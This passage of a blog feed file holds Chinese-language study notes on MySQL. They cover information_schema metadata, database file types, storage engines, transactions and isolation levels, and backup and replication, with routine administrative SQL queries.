class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>TABLE_ROWS<span class="token punctuation">`</span></span> <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>AVG_ROW_LENGTH<span class="token punctuation">`</span></span> <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>DATA_LENGTH<span class="token punctuation">`</span></span> <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>MAX_DATA_LENGTH<span class="token punctuation">`</span></span> <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>INDEX_LENGTH<span class="token punctuation">`</span></span> <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>DATA_FREE<span class="token punctuation">`</span></span> <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>AUTO_INCREMENT<span class="token punctuation">`</span></span> <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>CREATE_TIME<span class="token punctuation">`</span></span> <span class="token keyword">datetime</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>UPDATE_TIME<span class="token punctuation">`</span></span> <span class="token keyword">datetime</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>CHECK_TIME<span class="token punctuation">`</span></span> <span class="token keyword">datetime</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>TABLE_COLLATION<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>CHECKSUM<span class="token punctuation">`</span></span> <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>CREATE_OPTIONS<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>TABLE_COMMENT<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span>MEMORY <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>desc information_schema.tables; 存储了数据表的元数据信息</li></ul><table><thead><tr><th align="left">Field</th><th align="left">Type</th><th align="left">Null</th><th align="left">Key</th><th align="left">Default</th><th align="left">Extra</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">TABLE_CATALOG</td><td align="left">varchar(512)</td><td align="left">NO</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">TABLE_SCHEMA</td><td align="left">varchar(64)</td><td align="left">NO</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left">DB名</td></tr><tr><td align="left">TABLE_NAME</td><td align="left">varchar(64)</td><td align="left">NO</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left">表名</td></tr><tr><td align="left">TABLE_TYPE</td><td align="left">varchar(64)</td><td align="left">NO</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">ENGINE</td><td align="left">varchar(64)</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">VERSION</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">ROW_FORMAT</td><td align="left">varchar(10)</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left">是否压缩</td></tr><tr><td align="left">TABLE_ROWS</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left">表的粗略行统计</td></tr><tr><td align="left">AVG_ROW_LENGTH</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">DATA_LENGTH</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left">表的大小（单位字节）</td></tr><tr><td align="left">MAX_DATA_LENGTH</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">INDEX_LENGTH</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left">索引大小</td></tr><tr><td align="left">DATA_FREE</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left">碎片大小</td></tr><tr><td align="left">AUTO_INCREMENT</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">CREATE_TIME</td><td align="left">datetime</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">UPDATE_TIME</td><td align="left">datetime</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">CHECK_TIME</td><td align="left">datetime</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">TABLE_COLLATION</td><td align="left">varchar(32)</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">CHECKSUM</td><td align="left">bigint(21) unsigned</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">CREATE_OPTIONS</td><td align="left">varchar(255)</td><td align="left">YES</td><td align="left"></td><td align="left">NULL</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">TABLE_COMMENT</td><td align="left">varchar(2048)</td><td align="left">NO</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><ul><li>查看所有db</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">distinct</span> TABLE_SCHEMA <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>查看表大小</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token function">sum</span><span class="token punctuation">(</span>DATA_LENGTH<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">sum</span><span class="token punctuation">(</span>INDEX_LENGTH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> size <span class="token keyword">from</span> <span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'mysql'</span> <span class="token operator">and</span> table_name <span class="token operator">like</span> <span class="token string">'time_%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看数据库大小</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token function">sum</span><span class="token punctuation">(</span>DATA_LENGTH<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">sum</span><span class="token punctuation">(</span>INDEX_LENGTH<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> size <span class="token keyword">from</span> <span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'mysql'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h3><ul><li>官方建议碎片整理每周或每月一次即可。</li><li>optimize table 只对MyISAM、BDB、InnoDB表起作用，尤其MyISAM最为明显。并不是所有表都需要碎片整理，一般只需要对包含可变长度的文本数据类型的表进行整理即可。</li><li>optimize table 运行过程中会锁定表。</li><li>默认情况下，直接对InnoDB引擎的数据表使用optimize table可能会显示[Table dose not support optimize,doing recreate + analyze instead] 的提示信息。这时候可以用mysqld –skip-new 或者 mysqld –safe-mode 命令来重启MySQL，以便让其他引擎支持optimize table。</li><li>对于mysql和Infobright等数据库，information_schema数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-文件</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E6%96%87%E4%BB%B6/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h4 id="参数文件"><a href="#参数文件" class="headerlink" title="参数文件"></a>参数文件</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql --help | grep my.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有参数文件，取源代码中的默认值。</p><h4 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h4><ul><li><p>错误日志</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># 查看文件位置</li></ul><p>show variables like &#39;log_error&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>:hexoPostRenderEscape–&gt;</p><ul><li><p>二进制日志</p><p>事务提交前进行记录。</p><p>记录对数据库执行更改的所有操作，主要作用是恢复和复制。</p><p>二进制日志文件在默认情况下没有启动，启动后会使性能下降1%。</p><ul><li><p>binlog_format（可以动态更改）</p><ol><li><p>statement 二进制日志文件记录逻辑SQL语句。</p></li><li><p>row 记录表的行更改情况。</p><p>生成的日志文件更大，网络开销也增加</p></li><li><p>mixed 默认statement，某些情况下用row。</p><blockquote><p>使用NDB引擎</p><p>使用UUID，ROW_COUNT()等不确定函数</p><p>使用insert delay</p><p>使用用户定义函数</p><p>使用临时表</p></blockquote></li></ol></li></ul></li><li><p>慢查询日志</p></li><li><p>查询日志</p></li></ul><h4 id="socket文件"><a href="#socket文件" class="headerlink" title="socket文件"></a>socket文件</h4><p>​用Unix域套接字方式进行连接时需要的文件</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show variables like &#39;socket&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="pid文件"><a href="#pid文件" class="headerlink" title="pid文件"></a>pid文件</h4><p>​MySQL实例的进程ID文件</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show variables like &#39;pid_file&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="表结构文件"><a href="#表结构文件" class="headerlink" title="表结构文件"></a>表结构文件</h4><p>​MySQL的数据存储都是按照表的，每个表都会有与之对应的文件。不论使用何种引擎，MySQL都有一个以frm为后缀的文件，记录表的结构定义。</p><h4 id="存储引擎文件"><a href="#存储引擎文件" class="headerlink" title="存储引擎文件"></a>存储引擎文件</h4><ul><li><p>表空间文件</p><p>MySQL存储的数据按表空间进行存放。</p><ol><li><p>默认表空间</p><p>默认情况下，会有一个默认初始化大小10MB、名为ibdata1的文件（默认表空间文件），通过innodb_data_file设置。</p></li><li><p>单独表空间</p><p>通过设置innodb_file_per_table可以将每个基于InnoDB存储引擎的表单独产生一个表空间，文件名为.idb。</p><p>单独表空间文件仅存储该表的数据、索引和插入缓冲，其余信息还是存放在默认表空间中。</p></li></ol></li></ul><p><img src="https://img-blog.csdnimg.cn/20200504133622515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><ul><li><p>重做日志文件</p><p>事务进行中，不断有重做日志写入文件，记录关于每个页更改的物理情况。</p><p>默认情况下会有两个文件，ib_ligfile0和ib_ligfile1（循环使用），记录了InnoDB的事务日志。</p><p>重做日志文件的只要作用是保证数据的完整性。如主机断电导致实例失败，InnoDB会使用日志回复到断电前的状态。</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200504133647661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-存储引擎和体系结构</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E5%92%8C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E5%92%8C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h3 id="MySQL有哪些常见的引擎，说说他们的区别？"><a href="#MySQL有哪些常见的引擎，说说他们的区别？" class="headerlink" title="MySQL有哪些常见的引擎，说说他们的区别？"></a>MySQL有哪些常见的引擎，说说他们的区别？</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show engines; #查看支持的引擎<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>MyISAM：非事务处理存储引擎</p><p>索引放在XX.MYI文件中，数据放在XX.MYD文件中。</p><p>在线分析处理OLAP。</p><p>全文索引。</p></li><li><p>InnoDB：具备外键功能的存储引擎、行锁</p><p>索引也是数据。数据和索引存在一个XX.IDB文件中。</p><p>在线事务处理OLTP。</p></li><li><p>Mermory：基于内存</p><p>Memory表至少比MyISAM表要快一个数量级，因为所有的数据都保存在内存中，不需要进行磁盘I&#x2F;O。Memory表的结构在重启以后还会保留，但数据会丢失。</p><p>默认hash索引。</p></li><li><p>Archive：数据存档，数据插入后不能修改，只支持insert和select</p><p>针对高写入压缩做了优化的简单引擎，压缩存储1：10。</p></li><li><p>Maria</p><p>MyISAM后续版本</p><p>缓存数据和索引文件，行锁设计，MVCC，支持事务，更好的BLOB字符类型处理性能</p></li><li><p>NDB</p><p>集群存储引擎</p><p>数据全放内存（可以将非索引数据放磁盘）</p></li><li><p>Merge、CSV、Sphinx、Infobright</p></li></ul><table><thead><tr><th>特点</th><th>InnoDB</th><th>MyISAM</th><th>Memory</th><th>Archive</th></tr></thead><tbody><tr><td>b+树索引</td><td>yes</td><td>yes</td><td>yes</td><td>no</td></tr><tr><td>MVCC</td><td>yes</td><td>no</td><td>no</td><td>no</td></tr><tr><td>事务</td><td>yes</td><td>no</td><td>no</td><td>no</td></tr><tr><td>存储限制</td><td>64TB</td><td>256TB</td><td>RAM</td><td>None</td></tr><tr><td>索引缓存</td><td>yes</td><td>yes</td><td>本身就是缓存</td><td>No</td></tr><tr><td>外键</td><td>yes</td><td>no</td><td>no</td><td>no</td></tr><tr><td>锁粒度</td><td>row</td><td>table</td><td>table</td><td>row</td></tr><tr><td>全文索引</td><td>yes</td><td>yes</td><td>no</td><td>no</td></tr><tr><td>数据缓存</td><td>yes</td><td>no</td><td>本身就是缓存</td><td>no</td></tr></tbody></table><h3 id="数据库和实例的区别"><a href="#数据库和实例的区别" class="headerlink" title="数据库和实例的区别"></a>数据库和实例的区别</h3><ul><li>数据库：物理操作系统文件或其他形式文件类型的集合。</li><li>数据库实例：有数据库后台进程&#x2F;线程以及一个共享内存区组成。</li></ul><h3 id="查看MySQL从哪里读取的配置文件"><a href="#查看MySQL从哪里读取的配置文件" class="headerlink" title="查看MySQL从哪里读取的配置文件"></a>查看MySQL从哪里读取的配置文件</h3><p>从上到下找my.cnf文件，最终值以最后一个文件中的参数为准。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">➜  ~ mysql <span class="token parameter variable">--help</span> <span class="token operator">|</span> <span class="token function">grep</span> my.cnf                      order of preference, my.cnf, <span class="token variable">$MYSQL_TCP_PORT</span>,/etc/my.cnf /etc/mysql/my.cnf /usr/local/Cellar/mysql-client/8.0.18/etc/my.cnf ~/.my.cnf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MySQL体系结构"><a href="#MySQL体系结构" class="headerlink" title="MySQL体系结构"></a>MySQL体系结构</h3><p><img src="https://img-blog.csdnimg.cn/20200504105206146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><ul><li>连接池</li><li>管理服务和工具</li><li>SQL接口</li><li>查询分析器</li><li>优化器</li><li>缓冲</li><li>存储引擎</li><li>物理文件</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-事务</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E4%BA%8B%E5%8A%A1/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E4%BA%8B%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="数据库引入事务的主要目的"><a href="#数据库引入事务的主要目的" class="headerlink" title="数据库引入事务的主要目的"></a>数据库引入事务的主要目的</h3><p>事务会把数据库从一种状态转换为另一种一致的状态，在提交工作时，可以确保要么所有修改都已经保存，要么都不保存。</p><h3 id="ACID特性"><a href="#ACID特性" class="headerlink" title="ACID特性"></a>ACID特性</h3><ul><li><p>原子性 atomicity</p><p>要么都成功，要么都失败。</p></li><li><p>一致性 consistency</p></li><li><p>事务执行前后，数据库的完整性约束没有破坏。（你的10张银行卡里共有100块，无论这10张银行卡之间怎么转账，也只有100块）</p></li><li><p>隔离性 isolation</p><p>一个事务的影响在事务提交前，其他事务都不可见。</p></li><li><p>持久性 durability</p><p>事务一旦提交，就是永久性的。</p></li></ul><h3 id="事务的实现"><a href="#事务的实现" class="headerlink" title="事务的实现"></a>事务的实现</h3><h4 id="redo"><a href="#redo" class="headerlink" title="redo"></a>redo</h4><p>事务通过重做（redo)日志文件和日志缓冲（InnoDB Log Buffer）实现。在写数据前，需要先写日志。这种实现方式称为预写日志方式（Write-Ahead Logging，WAL）</p><ul><li><p>当开始一个事务时，会记录该事务的一个LSN（Log Sequence Number，日志序列号）；</p></li><li><p>当事务执行时，会往InnoDB存储引擎的日志缓冲里插入事务日志；</p></li><li><p>事务提交是，必须将InnoDB存储引擎的日志缓冲写入磁盘。<br>通过预写日志的方式保证事务的完整性，会造成吸盘上存储的数据页和内存缓冲池中的页是不同步的。可以通过<code>show engine innodb status；</code>查看当前磁盘和日志的差距。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show engine innodb status;LOGLog sequence number 77292702 # 当前LSNLog flushed up to   77292702 # 刷新到重做日志文件的LSNPages flushed up to 77292702Last checkpoint at  77292702 # 刷新到磁盘的LSN0 pending log writes, 0 pending chkp writes8 log i&#x2F;o&#39;s done, 0.00 log i&#x2F;o&#39;s&#x2F;second<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="undo"><a href="#undo" class="headerlink" title="undo"></a>undo</h3><p>事务需要回滚，需要undo。undo与redo正好相反，对于数据库进行修改是，数据库不但会产生redo，还会产生一定量的undo。</p><p>redo存放在重做日志中，undo存放在数据库内部的一个特殊段（segment）中，称为undo段（undo segment），undue段位于共享表空间中。</p><p>undo用于将数据库逻辑的恢复到原来的样子，数据结构本身在回滚前后可能不是相同的。</p><h3 id="事务常用控制语句"><a href="#事务常用控制语句" class="headerlink" title="事务常用控制语句"></a>事务常用控制语句</h3><ul><li>begin</li><li>commit</li><li>rollback</li></ul><h3 id="事务的隔离级别"><a href="#事务的隔离级别" class="headerlink" title="事务的隔离级别"></a>事务的隔离级别</h3><ul><li><p>读未提交 read uncommitted</p><p>浏览访问</p></li><li><p>读已提交 read committed</p><p>游标稳定，生产上常用隔离级别</p></li><li><p>可重复度 repeatable read</p><p>InnoDB默认隔离级别，InnoDB在该级别下使用<code>next-key</code>锁的算法避免幻读的产生。</p></li><li><p>序列化 serializable</p><p>InnoDB会对每个select操作自动添加<code>lock in share mode</code>，即共享锁。因为InnoDB在rr的隔离级别就可以避免幻读，所以serializable隔离级别主要用于分布式事务。</p></li></ul><h4 id="查看事务隔离级别"><a href="#查看事务隔离级别" class="headerlink" title="查看事务隔离级别"></a>查看事务隔离级别</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select @@tx_isolation\G;select @@global.tx_isolation\G;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="分布式事务"><a href="#分布式事务" class="headerlink" title="分布式事务"></a>分布式事务</h4><p>分布式事务由一个或多个资源管理器、一个事务管理器和一个应用程序组成。</p><p>分布式事务使用两段式提交<code>two-phase commit</code>的方式。在第一个阶段，所有参与全局事务的节点都开始准备，告诉事务管理器他们准备好了。第二阶段，事务管理器告诉所有资源管理器执行rollback还是commit。如果任何节点显示不能提交，则所有节点都被告知需要回滚。</p><ul><li><p>资源管理器</p><p>提供访问事务资源的方法。通常一个数据库就是一个资源管理器。</p></li><li><p>事务管理器</p><p>协调参与全局事务中的各个事务。需要合参与全局事务中的所有资源管理器进行通信。</p></li><li><p>应用程序</p><p>定义事务的边界，置顶全局事务中的操作。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-备份与恢复</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="备份与恢复概述"><a href="#备份与恢复概述" class="headerlink" title="备份与恢复概述"></a>备份与恢复概述</h3><h4 id="按备份方法分："><a href="#按备份方法分：" class="headerlink" title="按备份方法分："></a>按备份方法分：</h4><ul><li><p>hot backup 热备、在线备份</p><p>数据库运行中直接备份，对正在运行的数据库没有任何影响。</p></li><li><p>cold backup 冷备、离线备份</p><p>最为简单，一般只需要拷贝相关的数据库物理文件即可。</p><p>优点：备份简单、恢复简单、恢复速度快、备份文件易于在不同操作系统和MySQL版本上恢复</p><p>缺点：备份文件大、不总是可以轻易跨平台。如大小写敏感、浮点数格式等。</p></li><li><p>warm backup 温备</p><p>数据库运行时进行备份，但是会对当前数据库的操作有影响，如加一个全局锁以保证数据的一致性。</p></li></ul><h4 id="按备份后文件内容分："><a href="#按备份后文件内容分：" class="headerlink" title="按备份后文件内容分："></a>按备份后文件内容分：</h4><ul><li><p>逻辑备份</p><p>备份后的文件内容时可读的，通常是文本文件，内容通常是SQL语句，或表内的数据数据，好处是可以看到导出文件的内容。适用于数据库的升级、迁移等，恢复所需要的时间往往较长。</p></li><li><p>裸文件备份</p><p>拷贝数据库的物理文件，数据库既可以处于运行状态，也可以处于停止状态。恢复时间短。</p></li></ul><h4 id="按备份数据的内容分："><a href="#按备份数据的内容分：" class="headerlink" title="按备份数据的内容分："></a>按备份数据的内容分：</h4><ul><li><p>完全备份</p><p>对数据库进行完整的备份。</p></li><li><p>增量备份</p><p>在上次完全备份的基础上，对更新的数据进行备份，官方并未提供增量备份的方法。</p></li><li><p>日志备份</p><p>主要是二进制日志的备份，通过对一个完全备份进行二进制日志的重做来完成数据库的point-in-time的恢复工作。</p></li></ul><h3 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h3><h4 id="复制的工作原理"><a href="#复制的工作原理" class="headerlink" title="复制的工作原理"></a>复制的工作原理</h4><p>异步同步，并非完全的主从同步。</p><ol><li>主服务器把数据更新记录到二进制日志中。</li><li>从服务器把主服务器的二进制日志拷贝到自己的中继日志（relay log)中。</li><li>从服务器重做中继日志中的事件，把更新应用到自己的数据库上。</li></ol><p><img src="https://img-blog.csdnimg.cn/20200505105757299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="复制不仅限于备份"><a href="#复制不仅限于备份" class="headerlink" title="复制不仅限于备份"></a>复制不仅限于备份</h4><ol><li><p>数据分布</p><p>不同数据中心之间实现数据拷贝。</p></li><li><p>读取的负载均衡</p><p>读写分离。</p></li><li><p>数据库备份</p><p>从服务器不是备份，不能完全代替备份。</p></li><li><p>高可用性和故障转移</p><p>减少故障的停机时间和恢复时间。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-主从同步原理</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E5%8E%9F%E7%90%86/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E5%8E%9F%E7%90%86/</url>
      
